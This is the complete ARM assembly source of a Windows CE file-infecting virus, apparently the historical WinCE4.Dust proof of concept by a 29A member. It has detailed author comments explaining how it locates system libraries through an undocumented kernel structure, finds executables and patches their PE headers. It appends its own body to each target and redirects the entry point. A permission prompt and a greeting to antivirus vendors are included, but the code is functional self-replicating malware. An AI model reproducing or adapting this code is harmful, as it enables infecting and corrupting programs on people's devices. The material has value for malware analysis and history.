
** virus_source **

  CODE32

   EXPORT  WinMainCRTStartup

   AREA .text, CODE, ARM

virus_start

; r11 - base pointer
virus_code_start   PROC
   stmdb   sp!, {r0 - r12, lr, pc}
   mov    r11, sp
   sub    sp, sp, #56     ; make space on the stack

   ; our stack space gets filled the following way
   ;    #-56 - udiv
   ;    #-52 - malloc
   ;    #-48 - free
   ; [r11, #-44] - CreateFileForMappingW
   ;    #-40 - CloseHandle
   ;    #-36 - CreateFileMappingW
   ;    #-32 - MapViewOfFile
   ;    #-28 - UnmapViewOfFile
   ;    #-24 - FindFirstFileW
   ;    #-20 - FindNextFileW
   ;    #-16 - FindClose
   ;    #-12 - MessageBoxW

   ;    #- 8 - filehandle
   ;    #- 4 - mapping handle

   bl    get_export_section

   ; we'll import via ordinals, not function names, because it's
   ; safe - even linker does that

   adr   r2, import_ordinals
   mov   r3, sp
   bl    lookup_imports

   ;
   bl    ask_user
   beq    jmp_to_host     ; are we allowed to spread?
   ;

   mov    r0, #0x23, 28
   mov    lr, pc
   ldr    pc, [r11, #-52]   ; allocate WFD
   mov    r4, r0

   cmp    r0, #0
   beq    jmp_to_host

   ; in the following code I use functions FindFirstFile/FindNextFile
   ; for finding *.exe files in the current directory. But in this
   ; case I made a big mistake. I didn't realize that WinCE is not
   ; aware of the current directory and thus we need to use absolute
   ; pathnames. That's why this code won't find files in the current
   ; directory, but rather always in root directory. I found this out when I
   ; was performing final tests, but because the aim was to create a
   ; proof-of-concept code and because the infection itself was already
   ; limited by the user's permission, I decided not to correct this
   ; bug

   adr    r0, mask
   mov    r1, r4
   mov    lr, pc
   ldr    pc, [r11, #-24]   ; find first file
   cmn    r0, #1
   beq    free_wfd

   mov    r5, r0
find_files_iterate
   ldr    r0, [r4, #28]     ; filesize high
   ldr    r1, [r4, #32]     ; filesize low

   cmp    r0, #0         ; file too big?
   bne    find_next_file

   cmp    r1, #0x1000      ; file smaller than 4096 bytes?
   addgt   r0, r4, #40      ; gimme file name
   blgt   infect_file

find_next_file
   mov    r0, r5
   mov    r1, r4
   mov    lr, pc
   ldr    pc, [r11, #-20]    ; find next file
   cmp    r0, #0         ; is there any left?
   bne    find_files_iterate

   mov    r0, r5
   mov    lr, pc
   ldr    pc, [r11, #-16]

free_wfd
   mov    r0, r4
   mov    lr, pc
   ldr    pc, [r11, #-48]    ; free WFD
   ;

jmp_to_host
   adr    r0, host_ep
   ldr    r1, [r0]        ; get host_entry
   ldr    r2, [r11, #56]     ; get pc
   add    r1, r1, r2       ; add displacement
   str    r1, [r11, #56]     ; store it back

   mov    sp, r11
   ldmia   sp!, {r0 - r12, lr, pc}
   ENDP

   ; we're looking for *.exe files
mask   DCB    "*", 0x0, ".", 0x0, "e", 0x0, "x", 0x0, "e", 0x0, 0x0, 0x0

   ; host entry point displacement
   ; in first generation let compiler count it
host_ep
   DCD    host_entry - virus_code_start - 8

   ; WinCE is a UNICODE-only platform and thus we'll use the W ending
   ; for api names (there are no ANSI versions of these)

import_ordinals
   DCW    2008       ; udiv
   DCW    1041       ; malloc
   DCW    1018       ; free
   DCW    1167       ; CreateFileForMappingW
   DCW    553        ; CloseHandle
   DCW    548        ; CreateFileMappingW
   DCW    549        ; MapViewOfFile
   DCW    550        ; UnmapViewOfFile
   DCW    167        ; FindFirstFileW
   DCW    181        ; FindNextFile
   DCW    180        ; FindClose
   DCW    858        ; MessageBoxW

   DCD    0x0

   ; basic wide string compare
wstrcmp   PROC
wstrcmp_iterate
   ldrh    r2, [r0], #2
   ldrh    r3, [r1], #2

   cmp    r2, #0
   cmpeq   r3, #0
   moveq   pc, lr

   cmp    r2, r3
   beq    wstrcmp_iterate

   mov    pc, lr
   ENDP

   ; on theWin32 platform, almost all important functions were located in the
   ; kernel32.dll library (and if they weren't, the LoadLibrary/GetProcAddresss pair
   ; was). The first infectors had a hardcoded imagebase of this dll and
   ; later they imported needed functions by hand from it. This
   ; turned out to be incompatible because different Windows versions might
   ; have different imagebases for kernel32. That's why more or less
   ; sophisticated methods were found that allowed coding in a
   ; compatible way. One of these methods is scanning memory for known values
   ; located in PE file header ("MZ") if the address inside the module is
   ; given. Because the function inside kernel32 calls the EntryPoint of
   ; every Win32 process, we've got this address. Then comparing the word
   ; on and aligned address (and decrementing it) against known values is
   ; enough to locate the imagebase. If this routine is even covered
   ; with SEH (Structured Exception Handling) everything is safe.

   ; I wanted to use this method on WinCE too, but I hit the wall.
   ; Probably to save memory space, there are no headers
   ; before the first section of the loaded module. There is thus no
   ; "MZ" value and scanning cannot be used even we have the address
   ; inside coredll.dll (lr registr on our entrypoint). Moreover, we
   ; cannot use SEH either, because SEH handlers get installed with
   ; the help of a special directory (the exception directory) in the PE file and
   ; some data before the function starts - this information would have
   ; to be added while infecting the victim (the exception directory
   ; would have to be altered) which is of course not impossible -- just
   ; a little bit impractical to implement in our basic virus.

   ; That's why I was forced to use a different approach. I looked
   ; through the Windows CE 3.0 source code (shared source,
   ; downloadable from Microsoft) and tried to find out how the loader
   ; performs its task. The Loader needs the pointer to the module's export
   ; section and its imagebase to be able to import from it. The result was a
   ; KDataStruct at a hardcoded address accessible from user mode (why Microsoft
   ; chose to open this loophole, I don't know)
   ; and mainly it's item aInfo[KINX_MODULES] which is a pointer to a
   ; list of Module structures. There we can find all needed values
   ; (name of the module, imagebase and export section RVA). In the
   ; code that follows I go through this one-way list and look for
   ; structure describing the coredll.dll module. From this structure I
   ; get the imagebase and export section RVA (Relative Virtual Address).

   ; what sounds relatively easy was in the end more work than I
   ; expected. The problem was to get the offsets in the Module
   ; structure. The source code and corresponding headers I had were for
   ; Windows CE 3.0, but I was writing for Windows CE 4.2 (Windows Mobile 2003),
   ; where the structure is different. I worked it out using the following
   ; sequence:
   ; I was able to get the imagebase offset using the trial-and-error
   ; method - I used the debugger and tried values inside the
   ; structure that looked like valid pointers. If there was something
   ; interesting, I did some memory sniffing to realize where I was.
   ; The export section pointer was more difficult. There is no real
   ; pointer, just the RVA instead. Adding the imagebase to RVA gives us the
   ; pointer. That's why I found coredll.dll in memory - namely the
   ; list of function names in export section that the library exports.
   ; This list is just a series of ASCIIZ names (you can see this list
   ; when opening the dll in your favourite hex editor). At the
   ; beginning of this list there must be a dll name (in this case
   ; coredll.dll) to which a RVA in the export section header
   ; points. Substracting the imagebase from the address where the dll
   ; name starts gave me an RVA of the dll name. I did a simple byte
   ; search for the byte sequence that together made this RVA value. This
   ; showed me where the (Export Directory Table).Name Rva is.
   ; Because this is a known offset within a known structure (which is
   ; in the beginning of export section), I was able to get
   ; the export section pointer this way. I again substracted the imagebase to
   ; get the export section RVA. I looked up this value in the coredll's
   ; Module structure, which finally gave me the export section RVA
   ; offset.

   ; this works on Pocket PC 2003; it works on
   ; my wince 4.20.0 (build 13252).
   ; On different versions the structure offsets might be different :-/

; output:
;  r0 - coredll base addr
;  r1 - export section addr
get_export_section   PROC
   stmdb   sp!, {r4 - r9, lr}

   ldr    r4, =0xffffc800   ; KDataStruct
   ldr    r5, =0x324     ; aInfo[KINX_MODULES]

   add    r5, r4, r5
   ldr    r5, [r5]

   ; r5 now points to first module

   mov    r6, r5
   mov    r7, #0

iterate
   ldr    r0, [r6, #8]     ; get dll name
   adr    r1, coredll
   bl    wstrcmp        ; compare with coredll.dll

   ldreq   r7, [r6, #0x7c]    ; get dll base
   ldreq   r8, [r6, #0x8c]    ; get export section rva

   add    r9, r7, r8
   beq    got_coredllbase    ; is it what we're looking for?

   ldr    r6, [r6, #4]
   cmp    r6, #0
   cmpne   r6, r5
   bne    iterate        ; nope, go on

got_coredllbase
   mov    r0, r7
   add    r1, r8, r7      ; yep, we've got imagebase
                   ; and export section pointer

   ldmia   sp!, {r4 - r9, pc}
   ENDP

coredll   DCB    "c", 0x0, "o", 0x0, "r", 0x0, "e", 0x0, "d", 0x0, "l", 0x0, "l", 0x0
      DCB    ".", 0x0, "d", 0x0, "l", 0x0, "l", 0x0, 0x0, 0x0

; r0 - coredll base addr
; r1 - export section addr
; r2 - import ordinals array
; r3 - where to store function adrs
lookup_imports   PROC
   stmdb   sp!, {r4 - r6, lr}

   ldr    r4, [r1, #0x10]    ; gimme ordinal base
   ldr    r5, [r1, #0x1c]    ; gimme Export Address Table
   add    r5, r5, r0

lookup_imports_iterate
   ldrh   r6, [r2], #2     ; gimme ordinal
   cmp    r6, #0        ; last value?

   subne   r6, r6, r4      ; substract ordinal base
   ldrne   r6, [r5, r6, LSL #2] ; gimme export RVA
   addne   r6, r6, r0      ; add imagebase
   strne   r6, [r3], #4     ; store function address
   bne    lookup_imports_iterate

   ldmia    sp!, {r4 - r6, pc}
   ENDP

; r0 - filename
; r1 - filesize
infect_file   PROC
   stmdb   sp!, {r0, r1, r4, r5, lr}

   mov    r4, r1
   mov    r8, r0

   bl    open_file       ; first open the file for mapping
   cmn    r0, #1
   beq    infect_file_end
   str    r0, [r11, #-8]    ; store the handle

   mov    r0, r4        ; now create the mapping with
                   ; maximum size == filesize
   bl    create_mapping
   cmp    r0, #0
   beq    infect_file_end_close_file
   str    r0, [r11, #-4]    ; store the handle

   mov    r0, r4
   bl    map_file       ; map the whole file
   cmp    r0, #0
   beq    infect_file_end_close_mapping
   mov    r5, r0

   bl    check_header     ; is it file that we can infect?
   bne    infect_file_end_unmap_view

   ldr    r0, [r2, #0x4c]    ; check the reserved field in
                   ; optional header against
   ldr    r1, =0x72617461    ; rata
   cmp    r0, r1        ; already infected?
   beq    infect_file_end_unmap_view

   ldr    r1, [r2, #0x3c]    ; gimme filealignment
   adr    r0, virus_start
   adr    r2, virus_end     ; compute virus size
   sub    r0, r2, r0
   mov    r7, r0        ; r7 now holds virus_size
   add    r0, r0, r4
   bl    _align_        ; add it to filesize and
   mov    r6, r0        ; align it to filealignment
                   ; r6 holds the new filesize

   mov    r0, r5
   mov    lr, pc
   ldr    pc, [r11, #-28]    ; UnmapViewOfFile

   ldr    r0, [r11, #-4]
   mov    lr, pc
   ldr    pc, [r11, #-40]    ; close mapping handle

   ;
   mov    r0, r8
   bl    open_file       ; reopen the file because via
                   ; closing the mapping handle file
                   ; handle was closed too
   cmn    r0, #1
   beq    infect_file_end
   str    r0, [r11, #-8]

   mov    r0, r6        ; create mapping again with the
   bl    create_mapping    ; new filesize (with virus appended)

   cmp    r0, #0
   beq    infect_file_end_close_file
   str    r0, [r11, #-4]

   mov    r0, r6
   bl    map_file       ; map it
   cmp    r0, #0
   beq    infect_file_end_close_mapping
   mov    r5, r0
   ;

   ; r5 - mapping base
   ; r7 - virus_size

   ldr    r4, [r5, #0x3c]    ; get PE signature offset
   add    r4, r4, r5      ; add the base

   ldrh   r1, [r4, #6]     ; get NumberOfSections
   sub    r1, r1, #1      ; we want the last section header
                   ; so dec
   mov    r2, #0x28       ; multiply with section header size
   mul    r0, r1, r2

   add    r0, r0, r4      ; add optional header start to displacement
   add    r0, r0, #0x78     ; add optional header size

   ldr    r1, [r4, #0x74]    ; get number of data directories
   mov    r1, r1, LSL #3    ; multiply with sizeof(data_directory)
   add    r0, r0, r1      ; add it because section headers
                   ; start after the optional header
                   ; (including data directories)

   ldr    r6, [r4, #0x28]    ; gimme entrypoint rva

   ldr    r1, [r0, #0x10]    ; get last section's size of rawdata
   ldr    r2, [r0, #0x14]    ; and pointer to rawdata
   mov    r3, r1
   add    r1, r1, r2      ; compute pointer to the first
                   ; byte available for us in the
                   ; last section
                   ; (pointer to rawdata + sizeof rawdata)
   mov    r9, r1        ; r9 now holds the pointer

   ldr    r8, [r0, #0xc]    ; get RVA of section start
   add    r3, r3, r8      ; add sizeof rawdata
   str    r3, [r4, #0x28]    ; set entrypoint

   sub    r6, r6, r3      ; now compute the displacement so that
                   ; we can later jump back to the host
   sub    r6, r6, #8      ; sub 8 because pc points to
                   ; fetched instruction (viz LTORG)

   mov    r10, r0
   ldr    r0, [r10, #0x10]   ; get size of raw data again
   add    r0, r0, r7      ; add virus size
   ldr    r1, [r4, #0x3c]
   bl    _align_        ; and align

   str    r0, [r10, #0x10]   ; store new size of rawdata
   str    r0, [r10, #0x8]    ; store new virtual size

   ldr    r1, [r10, #0xc]    ; get virtual address of last section
   add    r0, r0, r1      ; add size so get whole image size
   str    r0, [r4, #0x50]    ; and store it

   ldr    r0, =0x60000020    ; IMAGE_SCN_CNT_CODE | MAGE_SCN_MEM_EXECUTE |
                   ; IMAGE_SCN_MEM_READ
   ldr    r1, [r10, #0x24]   ; get old section flags
   orr    r0, r1, r0      ; or it with our needed ones
   str    r0, [r10, #0x24]   ; store new flags

   ldr    r0, =0x72617461
   str    r0, [r4, #0x4c]    ; store our infection mark

   add    r1, r9, r5      ; now we'll copy virus body
   mov    r9, r1        ; to space prepared in last section
   adr    r0, virus_start
   mov    r2, r7
   bl    simple_memcpy

   adr    r0, host_ep      ; compute number of bytes between
                   ; virus start and host ep
   adr    r1, virus_start
   sub    r0, r0, r1      ; because we'll store new host_ep
   str    r6, [r0, r9]     ; in the copied virus body

infect_file_end_unmap_view
   mov    r0, r5
   mov    lr, pc        ; unmap the view
   ldr    pc, [r11, #-28]
infect_file_end_close_mapping
   ldr    r0, [r11, #-4]
   mov    lr, pc        ; close the mapping
   ldr    pc, [r11, #-40]
infect_file_end_close_file
   ldr    r0, [r11, #-8]
   mov    lr, pc        ; close file handle
   ldr    pc, [r11, #-40]
infect_file_end
   ldmia   sp!, {r0, r1, r4, r5, pc}   ; and return
   ENDP

   ; a little reminiscence of my beloved book - Greg Egan's Permutation City
   DCB    "This code arose from the dust of Permutation City"
   ALIGN    4


   ; this function checks whether the file we want to infect is
   ; suitable
check_header  PROC
   ldrh   r0, [r5]
   ldr    r1, =0x5a4d      ; MZ?
   cmp    r0, r1
   bne    infect_file_end_close_mapping

   ldr    r2, [r5, #0x3c]
   add    r2, r2, r5

   ldrh   r0, [r2]
   ldr    r1, =0x4550      ; Signature == PE?
   cmp    r0, r1
   bne    check_header_end

   ldrh   r0, [r2, #4]
   ldr    r1, =0x1c0      ; Machine == ARM?
   cmp    r0, r1
   bne    check_header_end

   ldrh   r0, [r2, #0x5C]    ; IMAGE_SUBSYSTEM_WINDOWS_CE_GUI ?
   cmp    r0, #9
   bne    check_header_end

   ldrh   r0, [r2, #0x40]
   cmp    r0, #4        ; windows ce 4?

check_header_end
   mov    pc, lr
   ENDP

; r0 - file
open_file   PROC
   str    lr, [sp, #-4]!

   sub    sp, sp, #0xc
   mov    r1, #3
   str    r1, [sp]       ; OPEN_EXISTING
   mov    r3, #0
   mov    r2, #0
   str    r3, [sp, #8]
   str    r3, [sp, #4]
   mov    r1, #3, 2       ; GENERIC_READ | GENERIC_WRITE
   mov    lr, pc
   ldr    pc, [r11, #-44]    ; call CreateFileForMappingW to
                   ; get the handle suitable for
                   ; CreateFileMapping API
                   ; (on Win32 calling CreateFile is enough)
   add    sp, sp, #0xc

   ldr    pc, [sp], #4
   ENDP

; r0 - max size low
create_mapping   PROC
   str    lr, [sp, #-4]!

   mov    r1, #0
   sub    sp, sp, #8
   str    r0, [sp]
   str    r1, [sp, #4]
   mov    r2, #4        ; PAGE_READWRITE
   mov    r3, #0
   ldr    r0, [r11, #-8]
   mov    lr, pc
   ldr    pc, [r11, #-36]
   add    sp, sp, #8

   ldr    pc, [sp], #4
   ENDP

; r0 - bytes to map
map_file   PROC
   str    lr, [sp, #-4]!

   sub    sp, sp, #4
   str    r0, [sp]
   ldr    r0, [r11, #-4]
   mov    r1, #6        ; FILE_MAP_READ or FILE_MAP_WRITE
   mov    r2, #0
   mov    r3, #0
   mov    lr, pc
   ldr    pc, [r11, #-32]
   add    sp, sp, #4

   ldr    pc, [sp], #4
   ENDP


   ; not optimized (thus simple) mem copy
; r0 - src
; r1 - dst
; r2 - how much
simple_memcpy   PROC
   ldr    r3, [r0], #4
   str    r3, [r1], #4
   subs   r2, r2, #4
   bne    simple_memcpy
   mov    pc, lr
   ENDP


   ; (r1 - (r1 % r0)) + r0
; r0 - number to align
; r1 - align to what
_align_    PROC
   stmdb   sp!, {r4, r5, lr}

   mov    r4, r0
   mov    r5, r1

   mov    r0, r1
   mov    r1, r4

   ; ARM ISA doesn't have the div instruction so we'll have to call
   ; the coredll's div implementation

   mov    lr, pc
   ldr    pc, [r11, #-56]    ; udiv

   sub    r1, r5, r1
   add    r0, r4, r1

   ldmia   sp!, {r4, r5, pc}
   ENDP

   ; this function will ask user (via a MessageBox) whether we're
   ; allowed to spread or not
ask_user   PROC
   str    lr, [sp, #-4]!

   mov    r0, #0
   adr    r1, text
   adr    r2, caption
   mov    r3, #4

   mov    lr, pc
   ldr    pc, [r11, #-12]

   cmp    r0, #7

   ldr    pc, [sp], #4
   ENDP

   ; notice that the strings are encoded in UNICODE

   ; WinCE4.Dust by Ratter/29A
caption DCB    "W", 0x0, "i", 0x0, "n", 0x0, "C", 0x0, "E", 0x0, "4", 0x0
     DCB    ".", 0x0, "D", 0x0, "u", 0x0, "s", 0x0, "t", 0x0, " ", 0x0
     DCB    "b", 0x0, "y", 0x0, " ", 0x0, "R", 0x0, "a", 0x0, "t", 0x0
     DCB    "t", 0x0, "e", 0x0, "r", 0x0, "/", 0x0, "2", 0x0, "9", 0x0
     DCB    "A", 0x0, 0x0, 0x0

     ALIGN    4

   ; Dear User, am I allowed to spread?

text   DCB    "D", 0x0, "e", 0x0, "a", 0x0, "r", 0x0, " ", 0x0, "U", 0x0
     DCB    "s", 0x0, "e", 0x0, "r", 0x0, ",", 0x0, " ", 0x0, "a", 0x0
     DCB    "m", 0x0, " ", 0x0, "I", 0x0, " ", 0x0, "a", 0x0, "l", 0x0
     DCB    "l", 0x0, "o", 0x0, "w", 0x0, "e", 0x0, "d", 0x0, " ", 0x0
     DCB    "t", 0x0, "o", 0x0, " ", 0x0, "s", 0x0, "p", 0x0, "r", 0x0
     DCB    "e", 0x0, "a", 0x0, "d", 0x0, "?", 0x0, 0x0, 0x0
     ALIGN    4

     ; Just a little greeting to AV firms :-)

     DCB    "This is proof of concept code. Also, i wanted to make avers happy."
     DCB    "The situation when Pocket PC antiviruses detect only EICAR file had"
     DCB    " to end ..."
     ALIGN    4

   ; LTORG is a very important pseudo instruction, which places the
   ; literal pool "at" the place of its presence. Because the ARM
   ; instruction length is hardcoded to 32 bits, it is not possible in
   ; one instruction to load the whole 32bit range into a register (there
   ; have to be bits to specify the opcode). That's why the literal
   ; pool was introduced, which in fact is just an array of 32bit values
   ; that are not possible to load. This data structure is later
   ; accessed with the aid of the PC (program counter) register that points
   ; to the currently executed instruction + 8 (+ 8 because ARM processors
   ; implement a 3 phase pipeline: execute, decode, fetch and the PC
   ; points not at the instruction being executed but at the instruction being
   ; fetched). An offset is added to PC so that the final pointer
   ; points to the right value in the literal pool.

   ; the pseudo instruction ldr rX, =<value> while compiling gets
   ; transformed to a mov instruction (if the value is in the range of
   ; valid values) or it allocates its place in the literal pool and becomes a
   ; ldr, rX, [pc, #<offset>]
   ; similarly adr and adrl instructions serve to loading addresses
   ; to register.

   ; this approach's advantage is that with minimal effort we can get
   ; position independent code from the compiler which allows our
   ; code to run wherever in the address space the loader will load us.

   LTORG
virus_end

   ; the code after virus_end doesn't get copied to victims

WinMainCRTStartup PROC
   b     virus_code_start
   ENDP

   ; first generation entry point
host_entry
   mvn    r0, #0
   mov    pc, lr
   END
** virus_source_end **
